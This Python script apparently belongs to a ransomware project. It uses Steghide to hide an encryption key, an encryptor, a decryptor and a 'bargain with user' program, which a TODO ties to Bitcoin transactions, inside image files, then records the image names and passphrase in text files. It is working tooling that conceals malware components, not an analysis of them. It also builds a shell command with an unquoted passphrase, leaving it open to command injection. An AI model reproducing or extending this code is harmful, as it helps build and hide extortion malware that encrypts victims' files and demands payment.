
from cryptography.fernet import Fernet
import os
import subprocess


def embed_file(file_to_embed: str, cover_file: str, passphrase: str):
    """
    Executes commandlines to run Steghide and obtain in order
    to obtain the "secret" message embedded within a given image.
    :param file_to_embed: Represents the file to be secretly embedded in the LSB of our cover file.
    :param cover_file: Represents the path to the image to be examined for a message.
    :param passphrase: The key used to decrypt and access the "secret" message
        in the image.
    """
    print()
    steghide_compatible_files: list[str] = ["jpeg", "jpg", "bmp", "wav", "au"]
    steghide_path = 'steghide-0.5.1-win32\steghide\steghide.exe'

    # Checks the compatibility of the file type with Steghide
    _, cover_file_type = cover_file.split(".")
    if cover_file_type not in steghide_compatible_files:
        raise TypeError("Unsupported file for Steghide detected!")

    # Verifies that the needed images are indeed available; to help with testing
    if os.path.exists(cover_file):
        pass
    else:
        raise FileNotFoundError(f"The image name/path '{cover_file}' does not exist in the current directory."
                                f"Either the name fed to the variable in the code to be updated or the image "
                                 f"specified just doesn't exist.")

    # Represents the commandline argument to be run in Command Prompt in order to extract the embedded message
    command = f'"{steghide_path}" embed -cf "{cover_file}" -ef "{file_to_embed}" -p {passphrase}\n'
    try:
        # Runs Command Prompt in the background from within the venv
        process = subprocess.Popen("cmd.exe",
                                   stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   text=True)

        # Inputs the command we want to execute and runs them
        process.stdin.write(command)
        process.stdin.flush()

        # Prints out what's occurring within the command prompt itself
        output, errors = process.communicate()
        print(f"\nCommand Prompt Output when embedding {file_to_embed} into {cover_file}:"
              f"\n\tOutput: {output}\n")
        if errors:
            print(f"\tErrors: {errors}\n")

    except Exception as e:
        print(f"An unexpected error has occurred: {e}")



def main():
    passphrase: str = input("Input the passphrase to be used to extract your embedded files: ")

    print("**** .TXT FILE TO EMBED ****")
    if os.path.exists("key.txt"):
        with open("key.txt", "r") as file:
            key = file.read()
        print(f"Your encryption key is: {key}")
    else:
        key = Fernet.generate_key()
        with open("key.txt", "wb") as file:
            file.write(key)
        print(f"Your encryption key is: {key}")
    print("Note: You don't have to remember the key.")

    print()

    print("**** .PY/.EXE FILES TO EMBED ****")
    code_to_encrypt: str = input("Input the name of the .PY/.EXE file to be used to ENCRYPT files: ")
    code_to_decrypt: str = input("Input the name of the .PY/.EXE file to be used to DECRYPT files: ")
    # TODO: Update this to be bitcoin_transaction.py once that file has a GUI interface
    code_to_bargain_with_user: str = input("Input the name of the .PY/.EXE file to be used to BARGAIN with user: ")

    print()

    print("**** IMAGES TO BE EMBEDDED ****")
    image_containing_key: str = input("Input the name of the image (.JPG, .BMP, .WAV, .AU) to contain your KEY: ")
    image_containing_encryption_code: str = input("Input the name of the .BMP image to contain your ENCRYPTION code: ")
    image_containing_decryption_code: str = input("Input the name of the .BMP image to contain your DECRYPTION code: ")
    image_containing_bargain_code: str = input("Input the name of the .BMP image to contain your BARGAIN code: ")
    print("NOTE: Remember these images and reformat the image names in .PY files accordingly.")

    embed_file("key.txt", image_containing_key, passphrase)
    embed_file(code_to_encrypt, image_containing_encryption_code, passphrase)
    embed_file(code_to_bargain_with_user, image_containing_bargain_code, passphrase)
    embed_file(code_to_decrypt, image_containing_decryption_code, passphrase)

    with open("images.txt", "w") as file:
        lines = [f"{image_containing_key}\n", f"{image_containing_encryption_code}\n",
                 f"{image_containing_bargain_code}\n", f"{image_containing_decryption_code}\n"]
        file.writelines(lines)
    with open("passphrase.txt", "w") as file:
        file.writelines(f"{passphrase}")



main()
